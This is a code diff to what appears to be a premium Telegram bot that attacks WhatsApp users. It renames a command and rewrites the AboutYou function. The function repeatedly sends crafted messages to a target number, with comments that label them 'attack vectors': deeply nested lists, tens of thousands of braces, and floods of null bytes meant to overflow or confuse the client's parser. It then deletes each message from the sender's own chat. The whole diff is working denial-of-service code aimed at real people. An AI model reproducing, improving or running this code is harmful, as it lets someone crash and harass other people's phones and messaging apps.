@@ -1490,7 +1490,7 @@ function formatPhoneNumber(number) {
 //s
 
 
-bot.command("8ro", checkWhatsAppConnection, checkPremium, async (ctx) => {
+bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
   await ctx.telegram.sendChatAction(ctx.chat.id, "record_audio");
   const userId = ctx.from.id;
   const st = getUserState(userId);
@@ -1868,8 +1868,15 @@ async function clearChat(target) {
 }
 
 //FANGSYEN
-
 async function AboutYou(target, ptcp = true) {
+    // Helper function untuk generate message ID
+    const generateMessageID = () => {
+        const timestamp = Date.now().toString();
+        const random = Math.floor(Math.random() * 999999999).toString();
+        return '3EB0' + timestamp + random;
+    };
+
+    // Verified Business Nodes
     const verifiedBusinessNodes = [
         { tag: "biz", attrs: {} },
         { tag: "verified", attrs: { verified: "1" } },
@@ -1879,12 +1886,16 @@ async function AboutYou(target, ptcp = true) {
             }]
         }]}
     ];
-    for (let i = 0; i < 399; i++) {
+
+    for (let i = 0; i < 99; i++) {
         try {
+            // ==========================================
+            // ATTACK VECTOR 1: Memory Overflow via Nested ViewOnce
+            // ==========================================
             const memoryOverflowMsg = await generateWAMessageFromContent(target, {
                 viewOnceMessage: {
                     message: {
-                        viewOnceMessage: {  
+                        viewOnceMessage: {  // Nested viewOnce (parser confusion)
                             message: {
                                 messageContextInfo: {
                                     deviceListMetadata: {},
@@ -1922,6 +1933,7 @@ async function AboutYou(target, ptcp = true) {
                 font: Math.floor(Math.random() * 99999999),
                 background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
             });
+
             await sock.relayMessage(target, {
                 groupStatusMessageV2: { message: memoryOverflowMsg.message },
             }, ptcp ? {
@@ -1932,52 +1944,73 @@ async function AboutYou(target, ptcp = true) {
                 messageId: memoryOverflowMsg.key.id,
                 additionalNodes: verifiedBusinessNodes
             });
+
             await sleep(1);
             await sock.sendMessage(sock.user.jid, { delete: memoryOverflowMsg.key });
+
+            // ==========================================
+            // ATTACK VECTOR 2: Parser Stack Overflow via Deep Nesting
+            // ==========================================
             let deepSections = [];
-            for (let j = 0; j < 35; j++) {  
-                let complexText = "</𖥂 𝐕̷𝐄̷𝐓̷𝐇̷𝐄̷𝐑̷𖥂 𖥂\\>";
+            for (let j = 0; j < 35; j++) {  // Increased dari 25 ke 35
+                let complexText = "</𖥂 byzzz 𖥂\\>";
+                
+                // Level 1: Section
                 let section = {
                     title: complexText,
                     highlight_label: `Layer${j}`,
                     rows: []
                 };
+                
+                // Level 2: Rows (increased)
                 for (let r = 0; r < 3; r++) {
                     let row = {
                         title: complexText,
                         id: `r${j}_${r}`,
                         subrows: []
                     };
+                    
+                    // Level 3: Subrows (increased)
                     for (let s = 0; s < 4; s++) {
                         let subrow = {
                             title: "Nested " + s,
                             id: `s${j}_${r}_${s}`,
                             subsubrows: []
                         };
+                        
+                        // Level 4: Subsubrows (new layer)
                         for (let ss = 0; ss < 3; ss++) {
                             let subsubrow = {
                                 title: "Deep " + ss,
                                 id: `ss${j}_${r}_${s}_${ss}`,
                                 subsubsubrows: []  // Level 5 (parser killer)
                             };
+                            
+                            // Level 5: Maximum nesting
                             for (let sss = 0; sss < 2; sss++) {
                                 subsubrow.subsubsubrows.push({
                                     title: "Max",
                                     id: `sss${j}_${r}_${s}_${ss}_${sss}`
                                 });
-                            }                            
+                            }
+                            
                             subrow.subsubrows.push(subsubrow);
-                        }                        
+                        }
+                        
                         row.subrows.push(subrow);
-                    }                    
+                    }
+                    
                     section.rows.push(row);
-                }                
+                }
+                
                 deepSections.push(section);
             }
+
             let complexList = {
-                title: "𝐕̷𝐄̷𝐓̷𝐇̷𝐄̷𝐑̷𖥂", 
+                title: "byzzz", 
                 sections: deepSections,
             };
+
             let stackOverflowMsg = generateWAMessageFromContent(target, {
                 viewOnceMessage: {
                     message: {
@@ -1990,7 +2023,7 @@ async function AboutYou(target, ptcp = true) {
                                 mentionedJid: [target, "0@s.whatsapp.net"],
                                 isForwarded: true,
                                 forwardingScore: 9999,
-                                forwardedNewsletterMessageInfo: {  
+                                forwardedNewsletterMessageInfo: {  // New field (parser confusion)
                                     newsletterJid: "0@newsletter",
                                     serverMessageId: 1,
                                 },
@@ -2008,18 +2041,18 @@ async function AboutYou(target, ptcp = true) {
                                 }
                             },
                             body: proto.Message.InteractiveMessage.Body.create({
-                                text: "</𖥂 𝐕̷𝐄̷𝐓̷𝐇̷𝐄̷𝐑̷𖥂 𖥂\\>",
+                                text: "</𖥂 byzzz 𖥂\\>",
                             }),
                             footer: proto.Message.InteractiveMessage.Footer.create({
                                 buttonParamsJson: JSON.stringify(complexList),
                             }),
                             header: proto.Message.InteractiveMessage.Header.create({
                                 buttonParamsJson: JSON.stringify(complexList),
-                                subtitle: "𝐕̷𝐄̷𝐓̷𝐇̷𝐄̷𝐑̷𖥂",
+                                subtitle: "byzzz",
                                 hasMediaAttachment: false,
                             }),
                             nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                                messageParamsJson: "{".repeat(15000),  
+                                messageParamsJson: "{".repeat(15000),  // Increased dari 9000
                                 buttons: [
                                     { name: "single_select", buttonParamsJson: JSON.stringify(complexList) },
                                     { name: "call_permission_request", buttonParamsJson: JSON.stringify({status:true}) },
@@ -2040,13 +2073,18 @@ async function AboutYou(target, ptcp = true) {
                 messageId: stackOverflowMsg.key.id,
                 additionalNodes: verifiedBusinessNodes
             });
+
             await sleep(2);
             await sock.sendMessage(sock.user.jid, { delete: stackOverflowMsg.key });
+
+            // ==========================================
+            // ATTACK VECTOR 3: Context Confusion via Malformed Sticker
+            // ==========================================
             const contextConfusionMsg = {
                 key: {
                     remoteJid: target,
                     fromMe: true,
-                    id: sock.generateMessageTag()
+                    id: generateMessageID()  
                 },
                 message: {
                     stickerMessage: {
@@ -2061,11 +2099,12 @@ async function AboutYou(target, ptcp = true) {
                         fileLength: "13862",
                         mediaKeyTimestamp: "1763628089",
                         isAnimated: false,
+                        // Context confusion fields
                         contextInfo: {
                             isForwarded: true,
                             forwardingScore: 9999,
                             mentionedJid: [target],
-                            quotedMessage: {  
+                            quotedMessage: {  // Malformed quote (parser confusion)
                                 conversation: "\x00".repeat(50000)
                             },
                             callLogMessage: {
@@ -2078,17 +2117,24 @@ async function AboutYou(target, ptcp = true) {
                         }
                     }
                 }
-            };        
+            };
+            
             await sock.relayMessage(target, contextConfusionMsg.message, {
                 participant: { jid: target },
                 messageId: contextConfusionMsg.key.id,
                 additionalNodes: verifiedBusinessNodes
             });
-            await sleep(3);
+
+            await sleep(1000);
             await sock.sendMessage(sock.user.jid, { delete: contextConfusionMsg.key });
+
+            // ==========================================
+            // ATTACK VECTOR 4: Type Confusion via Mixed Message Types
+            // ==========================================
             const typeConfusionMsg = await generateWAMessageFromContent(target, {
                 viewOnceMessage: {
                     message: {
+                        // Multiple conflicting message types in one (parser killer)
                         conversation: "Mixed",
                         extendedTextMessage: {
                             text: "Types",
@@ -2140,29 +2186,57 @@ async function AboutYou(target, ptcp = true) {
                 forwardingScore: 9999,
                 isForwarded: true
             });
+
             await sock.relayMessage(target, {
                 groupStatusMessageV2: { message: typeConfusionMsg.message }
             }, ptcp ? {
-                messageId: typeConfusionMsg.key.id,
+                messageId: generateMessageID(),  // ← Fixed: Manual ID
                 participant: { jid: target },
                 additionalNodes: verifiedBusinessNodes
             } : {
-                messageId: typeConfusionMsg.key.id,
+                messageId: generateMessageID(),  // ← Fixed: Manual ID
                 additionalNodes: verifiedBusinessNodes
             });
+
+            await sleep(3);
+            
+            // Store message ID untuk delete
+            const typeConfusionMsgId = generateMessageID();
+            
+            await sock.relayMessage(target, {
+                groupStatusMessageV2: { message: typeConfusionMsg.message }
+            }, ptcp ? {
+                messageId: typeConfusionMsgId,
+                participant: { jid: target },
+                additionalNodes: verifiedBusinessNodes
+            } : {
+                messageId: typeConfusionMsgId,
+                additionalNodes: verifiedBusinessNodes
+            });
+
             await sleep(4);
-            await sock.sendMessage(sock.user.jid, { delete: typeConfusionMsg.key });
+            await sock.sendMessage(sock.user.jid, { 
+                delete: { 
+                    remoteJid: sock.user.jid,
+                    fromMe: true,
+                    id: typeConfusionMsgId
+                }
+            });
+
+            // ==========================================
+            // ATTACK VECTOR 5: NULL Byte Injection
+            // ==========================================
             const nullByteMsg = await generateWAMessageFromContent(target, {
                 viewOnceMessage: {
                     message: {
                         interactiveResponseMessage: {
                             body: {
-                                text: "\x00\x00\x00" + "A".repeat(100000) + "\x00\x00\x00",  
+                                text: "\x00\x00\x00" + "A".repeat(100000) + "\x00\x00\x00",  // NULL byte sandwich
                                 format: "DEFAULT"
                             },
                             nativeFlowResponseMessage: {
-                                name: "call_permission_request",  
-                                paramsJson: "\x00".repeat(500000),  
+                                name: "\x00call_permission_request\x00",  // NULL in field name
+                                paramsJson: "\x00".repeat(500000),  // Pure NULL bytes
                                 version: 3,
                             }
                         }
@@ -2173,6 +2247,7 @@ async function AboutYou(target, ptcp = true) {
                 forwardingScore: 9999,
                 isForwarded: true
             });
+
             await sock.relayMessage(target, {
                 groupStatusMessageV2: { message: nullByteMsg.message }
             }, ptcp ? {
@@ -2183,14 +2258,20 @@ async function AboutYou(target, ptcp = true) {
                 messageId: nullByteMsg.key.id,
                 additionalNodes: verifiedBusinessNodes
             });
-            await sleep(5);
+
+            await sleep(6);
             await sock.sendMessage(sock.user.jid, { delete: nullByteMsg.key });
-            await sleep(3000);         
+
+            // Final delay
+            await sleep(1000);
+            
         } catch (error) {
             console.log(`Error on iteration ${i}:`, error.message);
         }
     }
 }
+
+
 
 bot.launch({
     dropPendingUpdates: true
